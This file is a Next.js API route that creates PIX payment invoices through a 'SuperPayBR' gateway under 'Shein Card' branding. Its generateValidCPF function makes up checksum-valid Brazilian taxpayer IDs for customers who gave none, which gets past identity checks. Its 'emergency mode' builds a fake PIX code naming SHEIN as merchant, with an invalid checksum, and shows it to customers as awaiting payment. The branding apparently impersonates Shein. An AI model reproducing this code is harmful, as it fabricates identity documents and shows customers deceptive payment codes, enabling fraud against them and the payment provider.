import { type NextRequest, NextResponse } from "next/server"
import { createClient } from "@supabase/supabase-js"

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!)

// Função para gerar CPF válido
function generateValidCPF(): string {
  const randomDigits = () => Math.floor(Math.random() * 9)
  const cpf = Array.from({ length: 9 }, randomDigits)

  // Calcular primeiro dígito verificador
  let sum = cpf.reduce((acc, digit, index) => acc + digit * (10 - index), 0)
  let firstDigit = 11 - (sum % 11)
  if (firstDigit >= 10) firstDigit = 0
  cpf.push(firstDigit)

  // Calcular segundo dígito verificador
  sum = cpf.reduce((acc, digit, index) => acc + digit * (11 - index), 0)
  let secondDigit = 11 - (sum % 11)
  if (secondDigit >= 10) secondDigit = 0
  cpf.push(secondDigit)

  return cpf.join("")
}

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    const { amount, external_id, customer_name, customer_email, customer_cpf } = body

    if (!amount || !external_id) {
      return NextResponse.json(
        {
          success: false,
          error: "Parâmetros obrigatórios: amount, external_id",
        },
        { status: 400 },
      )
    }

    console.log("📋 Dados da fatura:", {
      amount,
      external_id,
      customer_name,
      customer_email,
    })

    // Tentar autenticação primeiro
    let authData = null
    let useEmergencyMode = false

    try {
      const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
      const authResult = await authResponse.json()

      if (authResult.success) {
        authData = authResult.data
        console.log("✅ Autenticação SuperPayBR bem-sucedida")
      } else {
        console.log("❌ Falha na autenticação SuperPayBR:", authResult.error)
        useEmergencyMode = true
      }
    } catch (error) {
      console.log("❌ Erro na autenticação SuperPayBR:", error)
      useEmergencyMode = true
    }

    // Se autenticação falhou, usar modo emergência
    if (useEmergencyMode) {
      console.log("🚨 ATIVANDO MODO EMERGÊNCIA")
      return createEmergencyInvoice(amount, external_id)
    }

    // Tentar criar fatura real na SuperPayBR
    try {
      const validCPF = customer_cpf || generateValidCPF()
      const invoiceData = {
        external_id,
        amount: Math.round(amount * 100), // Converter para centavos
        currency: "BRL",
        payment_method: "pix",
        customer: {
          name: customer_name || "Cliente Shein Card",
          email: customer_email || "cliente@sheincard.com",
          document: validCPF,
          document_type: "cpf",
        },
        notification_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        expires_at: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutos
      }

      console.log("📤 Enviando dados para SuperPayBR:", invoiceData)

      const createResponse = await fetch("https://api.superpaybr.com/invoices", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${authData.access_token}`,
        },
        body: JSON.stringify(invoiceData),
      })

      if (createResponse.ok) {
        const invoice = await createResponse.json()
        console.log("✅ Fatura SuperPayBR criada:", invoice.id)

        // Salvar no banco de dados
        await supabase.from("faturas").insert({
          external_id,
          invoice_id: invoice.id,
          amount: amount,
          status: "pending",
          payment_method: "pix",
          customer_data: invoiceData.customer,
          created_at: new Date().toISOString(),
        })

        return NextResponse.json({
          success: true,
          data: {
            id: invoice.id,
            external_id,
            status: {
              code: 1,
              title: "Aguardando Pagamento",
            },
            payment: {
              details: {
                qrcode: invoice.payment?.qr_code || null,
                pix_code: invoice.payment?.pix_code || null,
              },
            },
            prices: {
              total: amount,
            },
            type: "real",
          },
          fallback_mode: false,
          emergency_mode: false,
        })
      } else {
        const errorText = await createResponse.text()
        console.log("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, errorText)
        throw new Error(`SuperPayBR API Error: ${createResponse.status}`)
      }
    } catch (error) {
      console.log("❌ Erro na criação da fatura SuperPayBR:", error)
      console.log("🚨 Ativando modo emergência por erro na API")
      return createEmergencyInvoice(amount, external_id)
    }
  } catch (error) {
    console.log("❌ Erro geral na criação da fatura:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno na criação da fatura",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}

// Função para criar fatura de emergência
async function createEmergencyInvoice(amount: number, external_id: string) {
  console.log("🚨 Criando fatura de emergência...")

  const emergencyPixCode = `00020101021226580014br.gov.bcb.pix2536emergency.quickchart.io/qr/v2/${external_id}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

  const emergencyInvoice = {
    id: `EMG_${external_id}`,
    external_id,
    status: {
      code: 1,
      title: "Aguardando Pagamento (Modo Emergência)",
    },
    payment: {
      details: {
        qrcode: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPixCode)}&size=250&margin=1&format=png`,
        pix_code: emergencyPixCode,
      },
    },
    prices: {
      total: amount,
    },
    type: "emergency",
  }

  // Salvar no banco de dados
  try {
    await supabase.from("faturas").insert({
      external_id,
      invoice_id: emergencyInvoice.id,
      amount: amount,
      status: "pending",
      payment_method: "pix",
      customer_data: { name: "Cliente Emergência" },
      created_at: new Date().toISOString(),
      is_emergency: true,
    })
  } catch (dbError) {
    console.log("⚠️ Erro ao salvar fatura de emergência no DB:", dbError)
  }

  console.log("✅ Fatura de emergência criada")

  return NextResponse.json({
    success: true,
    data: emergencyInvoice,
    fallback_mode: false,
    emergency_mode: true,
  })
}
